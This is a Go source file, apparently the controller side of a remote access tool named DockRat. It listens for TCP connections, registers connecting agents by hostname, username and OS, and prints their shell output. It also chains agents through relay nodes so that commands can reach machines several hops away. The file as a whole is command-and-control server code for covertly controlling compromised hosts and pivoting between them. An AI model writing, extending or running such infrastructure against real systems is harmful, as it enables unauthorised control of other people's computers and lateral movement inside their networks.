package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
)

// -------------------------- admin专用的监听函数 -------------------------

func StartListener(addr string, registry *node.Registry) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
	}
	log.Printf("[+] Listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn, registry)
	}
}

func handleConnection(conn net.Conn, registry *node.Registry) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload protocol.HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
		}
		id := registry.Add(n)
		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)

		go handleAgentMessages(n, registry)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node, registry *node.Registry) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
		case protocol.MsgShell:
			fmt.Print(string(msg.Payload))
		case protocol.MsgRelayReady:
			var payload protocol.RelayReadyPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayReady decode failed: %v", err)
				return
			}
			// nodeInfo, ok := registry.Get(payload.SelfID)
			// ip := "(unknown)"
			// if ok {
			// 	ip = nodeInfo.Addr
			// }
			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)

			// 可选：标记该 node 为 relay（拓扑用途）
			// if relayNode, ok := registry.Get(payload.SelfID); ok {
			// 	// 如果你有 isRelay 字段，可在此设置
			// 	log.Printf("[*] Relay node %d confirmed ready", payload.SelfID)
			// }
		case protocol.MsgRelayRegister:
			var payload protocol.RelayRegisterPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayRegister decode failed: %v", err)
				return
			}

			newNode := payload.Node
			newID := newNode.ID

			// 检查是否冲突
			if _, exists := registry.Get(newID); exists {
				log.Printf("[-] Duplicate node ID %d rejected", newID)
				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
				sendAck(n.Conn, protocol.MsgRelayError, resp)
				return
			}

			// 注册
			registry.AddWithID(&newNode)
			registry.NodeGraph.SetParent(newID, payload.ParentID)
			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)

			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
			sendAck(n.Conn, protocol.MsgRelayAck, resp)
		case protocol.MsgRelayPacket:
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Printf("[-] RelayPacket decode failed: %v", err)
				return
			}

			// 尝试解嵌套 Message
			innerMsg, err := protocol.DecodeMessage(pkt.Data)
			if err != nil {
				log.Printf("[-] Failed to decode inner message: %v", err)
				return
			}

			// ✅ 判断 inner 消息类型，决定是上传的“响应”，还是需要继续转发的“命令”
			switch innerMsg.Type {
			case protocol.MsgResponse, protocol.MsgShell:
				// 回传路径：打印结果
				switch innerMsg.Type {
				case protocol.MsgResponse:
					log.Printf("[#] Node %d response:\n%s", pkt.DestID, string(innerMsg.Payload))

				case protocol.MsgShell:
					fmt.Print(string(innerMsg.Payload))

				default:
					log.Printf("[-] Unknown inner message type from node %d: %s", pkt.DestID, innerMsg.Type)
				}
			default:
				// 下发路径：继续向目标 relay 转发
				parentID := registry.NodeGraph.GetParent(pkt.DestID)
				if parentID == -1 {
					log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
					return
				}
				parentNode, ok := registry.Get(parentID)
				if !ok || parentNode.Conn == nil {
					log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
					return
				}

				// 保留原始封装继续发送
				fwdMsg := protocol.Message{
					Type:    protocol.MsgRelayPacket,
					Payload: msg.Payload,
				}
				buf, err := protocol.EncodeMessage(fwdMsg)
				if err != nil {
					log.Printf("[-] Failed to encode relay forward: %v", err)
					return
				}
				_, err = parentNode.Conn.Write(buf)
				if err != nil {
					log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
				}
			}

		// case protocol.MsgRelayPacket:
		// 	var pkt protocol.RelayPacket
		// 	if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
		// 		log.Printf("[-] RelayPacket decode failed: %v", err)
		// 		return
		// 	}

		// 	// 尝试寻找下一跳：即该节点的父节点（relay）
		// 	parentID := registry.NodeGraph.GetParent(pkt.DestID)
		// 	if parentID == -1 {
		// 		log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
		// 		return
		// 	}

		// 	parentNode, ok := registry.Get(parentID)
		// 	if !ok || parentNode.Conn == nil {
		// 		log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
		// 		return
		// 	}

		// 	// 重新封装 relay packet 向下发
		// 	fwdMsg := protocol.Message{
		// 		Type:    protocol.MsgRelayPacket,
		// 		Payload: msg.Payload,
		// 	}
		// 	buf, err := protocol.EncodeMessage(fwdMsg)
		// 	if err != nil {
		// 		log.Printf("[-] Failed to encode relay forward: %v", err)
		// 		return
		// 	}
		// 	_, err = parentNode.Conn.Write(buf)
		// 	if err != nil {
		// 		log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
		// 	}

		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
		}
	}
}
func sendAck(conn net.Conn, msgType protocol.MessageType, ack protocol.RelayAckPayload) {
	data, _ := json.Marshal(ack)
	msg := protocol.Message{
		Type:    msgType,
		Payload: data,
	}
	buf, _ := protocol.EncodeMessage(msg)
	conn.Write(buf)
}
